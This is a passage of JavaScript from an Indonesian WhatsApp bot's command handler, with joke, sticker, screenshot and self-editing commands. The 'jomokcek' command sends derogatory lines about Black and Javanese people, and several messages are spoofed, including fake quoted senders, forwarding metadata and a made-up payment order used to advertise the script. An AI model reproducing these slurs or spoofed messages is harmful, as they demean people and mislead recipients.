    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('*DONE✅*\n_SILAHKAN MENCOBANYA_');
            }
        });
    } else {
        reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break

case 'delcase': {
if (!isCreator) return reply(mess.owner)
function delCase(filePath, caseName) {
    try {
        let code = fs.readFileSync(filePath, 'utf8');
        const caseIndex = code.indexOf(`case '${caseName}':`);

        if (caseIndex !== -1) {
            let startIndex = code.lastIndexOf('case', caseIndex);
            let endIndex = code.indexOf('break', caseIndex);
            let afterBreakIndex = code.indexOf(';', endIndex);

            if (afterBreakIndex !== -1) {
                afterBreakIndex += 1; // Tambahkan satu karakter untuk memasukkan titik koma
            } else {
                afterBreakIndex = endIndex + 5; // Tambahkan panjang dari "break" tanpa titik koma
            }

            let before = code.slice(0, startIndex);
            let after = code.slice(afterBreakIndex);
            let newCode = before + after;

            fs.writeFileSync(filePath, newCode, 'utf8');
            return true;
        } else {
            console.error(`Tidak dapat menemukan case dengan nama '${caseName}'.`);
            return false;
        }
    } catch (error) {
        console.error(error);
        return false;
    }
}

           if (!isCreator) {
           return
           }
          if(!text) return reply(`masukkan nama case`)
       let data = await delCase('case.js', text)
       if(data) {
           reply(`Berhasil menghapus case ${text}`)
           } else {
               reply(`${data}`)
               }
               }
break

  

case 'rules':{
if (!m.isGroup) return reply(mess.group)
let teks =`_*Peraturan WhatsApp ‼️*_

1. Di larang untuk memperluas nomor WhatsApp kami
2. Kami tidak menyimpan gambar, video,file,audio,dan lain lain 
3. Jangan menelpon bot [ Auto Blok ]
4. Jika ada kendala/error/bug silahkan hubungi owner
5. Kamu tidak akan menanggapi user yang meminta untuk ngesv nomor

_*Terimakasih atas pengertiannya kami silahkan untuk menggunakan fitur yang sudah tersedia mohon di pahami dan jika ada kurang dan lebih mohon di maafkan🙏*_`
alifatah.relayMessage(m.chat, { liveLocationMessage: { 
degreesLatitude: -7.2678119,
degreesLongitude: 107.81886705,
caption : teks,
sequenceNumber: 1709322015967001, timeOffset: 8600, jpegThumbnail: null,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
containsAutoReply: true,
showAdAttribution: false,
}
}
}
}, { quoted:fcall })
}
break

case 'cekasalmember': {
  if (!m.isGroup) return reply(mess.group)
  const participants = await alifatah.groupMetadata(m.chat).then(metadata => metadata.participants);
  let countIndonesia = 0;
  let countMalaysia = 0;
  let countUSA = 0;
  let countOther = 0;
  
  participants.forEach(participant => {
    const phoneNumber = participant.id.split('@')[0];
    if (phoneNumber.startsWith("62")) {
      countIndonesia++;
    } else if (phoneNumber.startsWith("60")) {
      countMalaysia++;
    } else if (phoneNumber.startsWith("1")) {
      countUSA++;
    } else if (phoneNumber.startsWith("+1")) {
      countOther++;
    } else {
      countOther++;
    }
  });
  
  const replyMessage = `Jumlah Anggota Grup Berdasarkan Negara:\n\nAnggota Indonesia: ${countIndonesia} 🇮🇩\nAnggota Malaysia: ${countMalaysia} 🇲🇾\nAnggota USA + OTHER : ${countUSA} 🇺🇲\nAnggota Negara Lain: ${countOther} 🏳️`;
  reply(replyMessage)
  }
  break

case 'wangy': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Contoh : ${prefix + command} Fauzialifatah`)
let qq = q.toUpperCase()
let awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
reply(awikwok)
}
break

case 'kapankah': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break

case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Fauzialifatah`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break

case 'cantikcek': case 'cekcantik': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Fauzialifatah`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
break

case 'jomokcek': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gans = ['10% hitam','2% j*wa','h*tam banget wak bjir 😂','jomok ansing jangan di temenin','wah wah sang makhluk h*tam datang','buset wak j*wir 😂','orang suci 🧘🏾‍♂️','j*wa njir 👉🏽💩👈🏽','sang raja h*tam telah datang, mohon tundukan kepala']
const tengs = gans[Math.floor(Math.random() * gans.length)]
reply(`Si ${q} *${tengs}*`)
}
break

case 'gantengcek': case 'cekganteng': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
break

case 'rate': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
break

case 'bagaimanakah': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
break

case 'bisakah': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
break

case 'apakah': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break

case 'carajadibot':
case 'cara-pasang':
let tutor2 = '*Step 1* kembali ke home WhatsApp lalu klik *titik tiga* di samping pojok kanan atas, lalu klik *Perangkat tertaut*'
let tutor3 = '*Step 2* klik *Tautkan perangkat*'
let tutor4 = '*Step 3* untuk cara memasukan kode klik *Tautkan dengan nomor telepon saja*'
let tutor5 = '*Step 4* masukan kode anda'
let imej1 = "https://telegra.ph/file/37a9b2865634333b25168.jpg"
let imej2 = "https://telegra.ph/file/cba5cd9154a4ffc4b2ae4.jpg"
let imej3 = "https://telegra.ph/file/cb39c8ab221045fb4a6e7.jpg"
let imej4 = "https://telegra.ph/file/a11753d255c49c0decac2.jpg"
let imej5 = "https://telegra.ph/file/e97424c82f58caa3109a8.jpg"
reply('untuk cara penggunaan, ikuti panduan berikut')
await
reply('pertama, sebelum menggunakan bot')
await
reply('pastikan anda sudah tahu cara pemasangan untuk mengkoneksikan bot anda dengan *alifatahice*')
await
reply('berikut adalah caranya')
await
alifatah.sendMessage(m.chat, {image: {url: imej2}, caption: tutor2})
await
alifatah.sendMessage(m.chat, {image: {url: imej3}, caption: tutor3})
await
alifatah.sendMessage(m.chat, {image: {url: imej4}, caption: tutor4})
await
alifatah.sendMessage(m.chat, {image: {url: imej5}, caption: tutor5})
break
//BATAS UPDATE SCRIPT ALIFATAH-MD 
/*case 'menfes': case 'confess':
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("You are still in the room")
if (args.length < 1) return reply(`Use ${prefix+command} number|your message\nExample ${prefix+command} Nomor|Hi Owner`)
if (text > 700) return reply(`The text is too long`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await alifatah.onWhatsApp(num)
if (cekno.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
if (num === m.sender) return reply(`Cannot Confess To Own Number!!!`)
if (num === botNumber) return reply(`Can't Confess to bot number!!!`)
var nomor = m.sender

const fauzialifatah = `*Hallo kak saya adalah bot WhatsApp, Seseorang mengirim pesan kepada anda and ini adalah pesan/chat yang di krim secara rahasia, [ PRIVATE CHAT ]*

💌 Message : _${pesan}_
`

await alifatah.sendMessage(num,
{ text: fauzialifatah,
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `© alifatahifatah Project v4`,
"body": `${pushname} 👋`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": alifatahv4,
"sourceUrl": `https://www.instagram.com/fauzialifatah_?igsh=ZDBhbmtqMjZteHVj`}}}, {quoted:fcall})

await alifatah.sendMessage(num, {text:`*NOTE✅*\n\nJika ingin membalas chat private tersebut bisa langsung chat owner agar membantu anda`}, { quoted : fake })
lidt = `[ 🇮🇩 ]Menfess anda telah terkirim, silahkan untuk mengecek fitur yang kami sudah sediakan terimakasih\n\n[ 🇬🇧 ] Your message has been sent, please check the features we have provided, thank you\n\n*Pesan💌*\n_${pesan}_
`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, num)
console.log("[ CONFESS ] Creating room for: " + sender);
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: Styles(`${lidt}`)
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ``
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: ``,
            subtitle: "",
            hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/f5d639e6a8a14c3005849.jpg')}, { upload: alifatah.waUploadToServer })) 
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Website\",\"url\":\"https://shoplinks.to/Marketingalifatahifatah\",\"merchant_url\":\"https://www.google.com\"}"
              }
           ],
          })
        })
    }
  }
}, {})
 alifatah.relayMessage(m.key.remoteJid, msgs.message, {
  messageId: m.key.id
})
}
break*/

case 'qc': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m.quoted.text
} else reply("Input teks atau reply teks yang ingin di jadikan quote!")
if (text.length > 30) return reply('Maksimal 30 Teks!')
let ppnyauser = await await alifatah.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
alifatah.sendImageAsSticker(m.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.namabot}`})
}
break

    case 'xxqc': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!q) return reply(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return reply(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return reply('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await alifatah.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
alifatah.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break

case 'sound': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
alifatah.sendMessage(m.chat, {
audio: fs.readFileSync('./V5Media/audio/ada apa kak.mp3'), mimetype:'audio/mpeg', ptt: false,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://www.youtube.com/@Fauzialifatah',
            thumbnailUrl: 'https://telegra.ph/file/d99a68478cff9ab5b9ac1.jpg',
            title: `ʜᴀʟʟᴏ ᴋᴀᴋ ɪɴɪ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴜ ᴜᴛᴀᴍᴀɴʏᴀ `,
            body: `${global.namaown} || ᴘᴇɴɢɢᴜɴᴀ : ${isCreator ? "Owner 👑️":"User ⚔️"}`,
        },
        forwardingScore: 999,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: 'bjir@newsletter',
            serverMessageId: null,
            newsletterName: global.namaown
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `_Fauzialifatah - WhatsApp Bot_`, }}});
}
break

case "ai": case "chatgpt": case "openai": {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!text) return reply (`Example : ${prefix + command} create code html & css for hack NASA`)
var js = await fetch(`https://aemt.me/openai?text=${q}`) 
var json = await js.json()
reply(json.result)
}
break

case "prompt-gpt": {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!text) return reply (`Example : ${prefix + command} buatkan lirik lagu tentang persahabatan dengan genre pop dan panjang 8 baris|# Lirik Lagu,# Genre: Pop,# Panjang: 8 baris,# Tema: Persahabatan`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
var js = await fetch(`https://aemt.me/prompt/gpt?prompt=${iniprompt}&text=${initeks}`) 
var json = await js.json()
reply(json.result)
}
break

case "sswebdesktop":{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebDesktop(text)
alifatah.sendMessage(m.chat ,{ image: krt.result, caption: mess.success },{ quoted:fcall })
}
break

case "sswebtablet":{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebTablet(text)
alifatah.sendMessage(m.chat ,{ image: krt.result, caption: mess.success },{ quoted:fcall })
}
break

case "sswebphone":{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebPhone(text)
alifatah.sendMessage(m.chat ,{ image: krt.result, caption: mess.success },{ quoted:fcall })
}
break

case "kill":case "pat":case "lick":case "bite":case "yeet":case "bonk":case "wink":case "poke":case "nom":case "slap":case "smile":case "wave":case "blush":case "smug":case "glomp":case "happy":case "dance":case "cringe":case "highfive":case "handhold":
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply(mess.wait)
let bugil = `🍻Succes Beb ÙnÚ`
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
alifatah.sendMessage(m.chat, {
image: {url: data.url },
caption: '😋 Istri Kartun :3'
},{quoted:fcall })
})
break

case 'neko':
case 'waifu':
case 'shinobu':
case 'megumin':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
alifatah.sendMessage(m.chat, {
image: {url: data.url },
caption: '😋 Istri Kartun :3'
},{quoted:fcall })
})
}
break

case 'ss': case 'ssweb':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!/^https?:\/\//.test(text)) return m?.reply('Awali *URL* dengan http:// atau https://')
let krt = await ssweb(text)
alifatah.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:fcall})
}
break

        case 'donetrx':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,tanggal`);
let barang = t[0];
let nominal = t[1];
let tanggal = t[2];
reply(`*━━ TRANSAKSI INFO ━━*

 _• *👜Barang:* ${barang}_
 _• *💰Nominal:* Rp${nominal}_
 _• *📅Tanggal:* ${tanggal}_
 _• *🔈︎︎Status:* Done_

*TERIMA KASIH TELAH ORDER DI ${global.namaown}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break

case 'capcut':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!text) return reply(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await alifatah.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
alifatah.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: mess.done}, {quoted:fcall})
await alifatah.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await alifatah.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break

case 'script': case 'sc': case 'scbot':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
    function generateReferenceId(length = 11) {
        return crypto.randomBytes(length).toString('hex').toUpperCase().slice(0, length);
    }

    let caption = `Tertarik? hubungi kontak di bawah\n\n- WA: https://wa.me/6282199509537\n`;
    const referenceId = generateReferenceId();

    let ngentod = await generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: caption,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: Styles(`Fauzialifatah - MD`),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            ...(await prepareWAMessageMedia(
                                { image: { url: `https://telegra.ph/file/b29e8a8622646929be26d.jpg` } },
                                { upload: alifatah.waUploadToServer },
                            )),
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "review_and_pay",
                                "buttonParamsJson": `{
                                    "currency": "IDR",
                                    "payment_configuration": "",
                                    "payment_type": "",
                                    "total_amount": {
                                        "value": 4000000,
                                        "offset": 100
                                    },
                                    "reference_id": "${referenceId}",
                                    "type": "physical-goods",
                                    "order": {
                                        "status": "payment_requested",
                                        "description": "",
                                        "subtotal": {
                                            "value": 5000000,
                                            "offset": 100
                                        },
                                        "tax": {
                                            "value": 661,
                                            "offset": 100
                                        },
                                        "discount": {
                                            "value": 2000000,
                                            "offset": 100
                                        },
                                        "order_type": "ORDER",
                                        "items": [
                                            {
                                                "retailer_id": "7537631592926009",
                                                "product_id": "7538731592926009",
                                                "name": "${namaown}",
                                                "amount": {
                                                    "value": 450510,
                                                    "offset": 1000
                                                },
                                                "quantity": ${totalFitur()}
                                            }
                                        ]
                                    },
                                    "additional_note": "━────────────────────━\n\n<!> Create Panel + Button\n<!> Payment + Button\n<!> Tampilan Utama + Button\n<!> Addprem, Delprem \n<!> Addsaldo, Minsaldo, Saldo\n<!> Confess + Button & Biasa\n<!> Internet + IA + chatgpt\n<!> prompt-gpt\n<!> Xxqc Warna alifatahl\n<!> Cara Connect Bot\n<!> Rules Simpel\n<!> Addcase \n<!> Delcase <Error>\n<!> backup\n<!>  TestiMoni Own\n<!> Asupan Menu\n\nHarga Script? 40k + Update\nButton? Menu, Confess, Dll\nNo Enc? 100%\n\n━────────────────────━",
                                    "native_payment_methods": []
                                }`
                            }],
                        }),
                        contextInfo: {
                            stanzaId: m.key.id,
                            remoteJid: m.isGroup ? m.sender : m.key.remoteJid,
                            participant: m.key.participant || m.sender,
                            fromMe: m.key.fromMe,
                            quotedMessage: m.message,
                        },
                    }),
                },
            },
        },
        {},
    );

